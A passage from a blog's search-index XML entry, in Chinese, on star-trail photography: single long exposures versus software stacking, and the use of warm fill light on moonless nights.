机没电，拍摄不到，而其他拍摄到的可以回家后利用电脑连接合成）<br>事实上！我到目前为止都还是使用「一曝到底」的方式拍摄星轨，原因在于，笔者个人认为：<br>摄影这件事情应该是尽量在镜头前完成必要的步骤，尽量少用合成软体。如此，你才可以让<br>自己想办法观天察地，减少对软体的依赖，增加在镜头前思考创作。而数位时代的演变下，<br>对于相关接图软体的知识补充​<br>当然是必要的课题。只要电力足够，借助软体的帮助可以拍出很长的星轨倒是一个方式！<br>在没有月光时，可以借助补光设备（尽量使用些微偏暖色补光，太冷的色温拍出的颜色较为<br>不讨喜），适当的帮景物补光，增加主体的细节，需不需要补光，实则见仁见智，各有利弊。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 摄影 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摄影 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
